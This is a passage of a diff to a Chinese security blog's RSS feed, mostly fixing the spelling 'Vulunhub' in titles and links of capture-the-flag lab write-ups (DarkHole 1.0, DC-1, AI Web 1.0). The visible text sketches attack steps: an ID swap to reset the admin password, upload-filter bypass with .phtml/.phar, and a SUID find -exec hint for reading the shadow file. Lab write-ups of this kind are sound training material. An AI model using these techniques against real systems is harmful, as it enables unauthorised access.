+&lt;p&gt;✔ 路径遍历&lt;/p&gt;</description></item><item><title>DarkHole1.0 Vulnhub靶场复现-重走来时路2</title><link>https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/</link><pubDate>Sat, 18 Jul 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/</guid><description>&lt;h1 id="darkhole1-vulnhub靶场复现-重走来时路-2"&gt;DarkHole1 Vulnhub靶场复现-重走来时路 2
 &lt;/h1&gt;&lt;h2 id="主机发现"&gt;主机发现
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
@@ -8050,11 +9055,11 @@ to the flag.txt file in the /root/ directory&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;将id=2改为1然后发送观察到密码以及修改完成&lt;/p&gt;
-&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="451px" data-flex-grow="188" height="1020" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1.png" srcset="https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1_hu_bea90983dbbb15e7.png 800w, https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1_hu_6b48aa1e62694005.png 1600w, https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1.png 1920w" width="1920"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="451px" data-flex-grow="188" height="1020" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1.png" srcset="https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1_hu_bea90983dbbb15e7.png 800w, https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1_hu_6b48aa1e62694005.png 1600w, https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1.png 1920w" width="1920"&gt;&lt;/p&gt;
 &lt;p&gt;回到登陆页面，尝试输入账户为admin 密码为1 可以发现登陆成功，账户是猜出来的，实际可经过各种尝试制作字典爆破尝试出账户名字&lt;/p&gt;
 &lt;p&gt;越权成功&lt;/p&gt;
 &lt;h2 id="文件上传尝试"&gt;文件上传尝试
-&lt;/h2&gt;&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="375px" data-flex-grow="156" height="1012" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2.png" srcset="https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2_hu_7495c7566012e158.png 800w, https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2.png 1584w" width="1584"&gt;&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="375px" data-flex-grow="156" height="1012" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2.png" srcset="https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2_hu_7495c7566012e158.png 800w, https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2.png 1584w" width="1584"&gt;&lt;/p&gt;
 &lt;p&gt;多了一个文件夹上传的功能，上传php弹出Sorry , Allow Ex : jpg,png,gif 仅这三种格式 尝试用其他格式绕过，php3 php3 php5 最后发现phtml和phar有效&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
@@ -8946,7 +9951,7 @@ sudo -lvnp 443&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@darkhole:~# 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>DC-1 Vulunhub靶场复现</title><link>https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Sat, 18 Jul 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="dc-1-vulunhub靶场复现"&gt;DC-1 Vulunhub靶场复现
+&lt;/div&gt;</description></item><item><title>DC-1 Vulnhub靶场复现</title><link>https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Sat, 18 Jul 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="dc-1-vulnhub靶场复现"&gt;DC-1 Vulnhub靶场复现
 &lt;/h1&gt;&lt;h2 id="主机发现"&gt;主机发现
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
@@ -9146,7 +10151,7 @@ sudo -lvnp 443&lt;/p&gt;
 &lt;/table&gt;
 &lt;p&gt;可以利用的似乎只有22 80 端口 ，并且版本较低&lt;/p&gt;
 &lt;p&gt;访问80端口，配合指纹插件&lt;/p&gt;
-&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="451px" data-flex-grow="188" height="1020" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1.png" srcset="https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1_hu_6c63825371d4b6db.png 800w, https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1_hu_60c22f34c5221512.png 1600w, https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1.png 1920w" width="1920"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="451px" data-flex-grow="188" height="1020" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1.png" srcset="https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1_hu_6c63825371d4b6db.png 800w, https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1_hu_60c22f34c5221512.png 1600w, https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1.png 1920w" width="1920"&gt;&lt;/p&gt;
 &lt;h2 id="漏洞扫描"&gt;漏洞扫描
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
@@ -9747,7 +10752,7 @@ sudo -lvnp 443&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id="访问http101010131user-之前nmap暴露出来的路径获取flag3"&gt;访问http://10.10.10.131/user 之前nmap暴露出来的路径获取flag3
-&lt;/h2&gt;&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="451px" data-flex-grow="188" height="1020" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2.png" srcset="https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2_hu_4c8c063d5345c87e.png 800w, https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2_hu_fabc4a41a219547c.png 1600w, https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2.png 1920w" width="1920"&gt;&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="451px" data-flex-grow="188" height="1020" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2.png" srcset="https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2_hu_4c8c063d5345c87e.png 800w, https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2_hu_fabc4a41a219547c.png 1600w, https://ke1thli.github.io/p/dc-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2.png 1920w" width="1920"&gt;&lt;/p&gt;
 &lt;p&gt;登陆之后点击dashboard 看到flag3点击获得&lt;/p&gt;
 &lt;p&gt;Special PERMS will help FIND the passwd - but you&amp;rsquo;ll need to -exec that command to work out how to get what&amp;rsquo;s in the shadow&lt;/p&gt;
 &lt;p&gt;特殊的PERMS权限将有助于找到密码，但你需要执行&lt;code&gt;-exec&lt;/code&gt;命令来弄清楚如何获取shadow文件中的内容。&lt;/p&gt;
@@ -9996,7 +11001,7 @@ sudo -lvnp 443&lt;/p&gt;
  &lt;td&gt;验证是否sql注入存在&lt;/td&gt;
  &lt;/tr&gt;
  &lt;/tbody&gt;
-&lt;/table&gt;</description></item><item><title>AI Web 1.0 Vulunhub靶场复现-重走来时路</title><link>https://ke1thli.github.io/p/ai-web-1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF/</link><pubDate>Sat, 11 Jul 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/ai-web-1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF/</guid><description>&lt;h1 id="ai-web-10-vulunhub靶场复现-重走来时路"&gt;AI Web 1.0 Vulunhub靶场复现-重走来时路
+&lt;/table&gt;</description></item><item><title>AI Web 1.0 Vulnhub靶场复现-重走来时路</title><link>https://ke1thli.github.io/p/ai-web-1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF/</link><pubDate>Sat, 11 Jul 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/ai-web-1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF/</guid><description>&lt;h1 id="ai-web-10-vulnhub靶场复现-重走来时路"&gt;AI Web 1.0 Vulnhub靶场复现-重走来时路
 &lt;/h1&gt;&lt;h2 id="主机发现"&gt;主机发现
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
